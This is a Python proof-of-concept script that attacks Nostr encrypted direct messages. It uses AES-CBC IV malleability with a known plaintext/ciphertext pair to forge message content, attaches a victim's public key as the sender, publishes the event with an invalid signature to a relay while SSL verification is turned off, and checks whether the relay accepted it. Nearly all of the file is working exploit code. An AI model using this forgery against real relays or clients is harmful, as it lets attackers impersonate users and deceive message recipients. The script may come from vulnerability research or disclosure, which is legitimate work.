import sys,os
import random,string,json,base64
from Crypto.Util.Padding import pad
from Crypto.Util.strxor import strxor
sys.path.append(os.path.join(os.path.dirname(__file__), './python-nostr/'))
from nostr.event import Event, EventKind, EncryptedDirectMessage
from nostr.relay_manager import RelayManager
from nostr.key import PrivateKey, PublicKey
from nostr.filter import Filter, Filters
from nostr.message_type import ClientMessageType

KNOWN_PLAINTEXT_HEX = b'0123456789abcdef'.hex()
KNOWN_CIPHERTEXT_HEX = 'ebd662225b5963a98a1597f5f86fe7775bfcaf220d5ec4d35027596b8f1452ec'
IV_HEX = '8f87229e745d108013caab716f6bdd07'

def forgery_dm(content:str):
  content_byte = content.encode('utf-8')
  if len(content_byte)>=16:
    content_byte = content_byte[:15]
  content_byte = pad(content_byte, 16)
  iv = bytes.fromhex(IV_HEX)[:16]
  known_plaintext = bytes.fromhex(KNOWN_PLAINTEXT_HEX)[:16]
  new_iv = strxor(strxor(known_plaintext, iv), content_byte)
  return base64.b64encode(bytes.fromhex(KNOWN_CIPHERTEXT_HEX)[:16]).decode('utf-8') + '?iv=' + base64.b64encode(new_iv).decode('utf-8')

import time, ssl

#SECRET_KEY = "2659a8fd4844dd4a1489ec277e21d6c548f30dba29452130746d4ad16a423adc"
#VICTIM_SENDER_PUBKEY = "aecb231214ed124c43ad53c2b0237e0f3658ec889d07a6bb8baaae0442db6033"
VICTIM_SENDER_PUBKEY = PublicKey.from_npub("npub1skynj8ynlun85jm95auypqw7w92saw4mlsyesstac2s2q32cuuss958de4").hex()
VICTIM_PUBKEY_NPUB = "npub17l5u796sc67sneg25ylyas47hsxxuypxdy4raz5r5vjattn0parssg4grf"
VICTIM_PUBKEY = "2c62a6ba421347b19b25812a509e7cac4558162ce3f5ede27b1d0b722a531207" #PublicKey.from_npub(VICTIM_PUBKEY_NPUB).hex()

relay_manager = RelayManager()
relay_manager.add_relay("wss://relay.example.com")
relay_manager.open_connections({"cert_reqs": ssl.CERT_NONE}) # NOTE: This disables ssl certificate verification

published_event_ids = list()

dm = Event(content = forgery_dm('forged!'), public_key=VICTIM_SENDER_PUBKEY, kind=EventKind.ENCRYPTED_DIRECT_MESSAGE)
#dm = Event(content = 'piumuZKpNjP/EUfEmNVeajlUP2UV1DaSyZOsAxBkMJk=?iv=o0ECmbc6Qsj2E3rmnL0mZQ==', public_key=VICTIM_SENDER_PUBKEY, kind=EventKind.ENCRYPTED_DIRECT_MESSAGE)
dm.add_pubkey_ref(VICTIM_PUBKEY)
# send with invalid sig
dm.signature = 'd4a739b22f298cb04f69f0a9636a09d9e308eb17c4b884ae130db511cb92a9954e3048ff22dd5f10605e42f6a79bf208f368b86b877a98a68f73c15b4679c382'
print(dm)

relay_manager.publish_event(dm)

#filters = Filters([Filter(authors=[VICTIM_PUBKEY])])
filters = Filters([Filter(authors=[VICTIM_SENDER_PUBKEY], kinds=[EventKind.ENCRYPTED_DIRECT_MESSAGE])])
subscription_id = "".join(random.choices(string.ascii_lowercase, k=64))
request = [ClientMessageType.REQUEST, subscription_id]
request.extend(filters.to_json_array())
relay_manager.add_subscription(subscription_id, filters)

message = json.dumps(request)
relay_manager.publish_message(message)
time.sleep(1) # allow the messages to send

while relay_manager.message_pool.has_events():
  event_msg = relay_manager.message_pool.get_event()
  #print(event_msg)
  #print(event_msg.event.id)
  published_event_ids.append(event_msg.event.id)


print("---")
print(dm.id)
print(published_event_ids)
print(dm.id in published_event_ids)

relay_manager.close_connections()
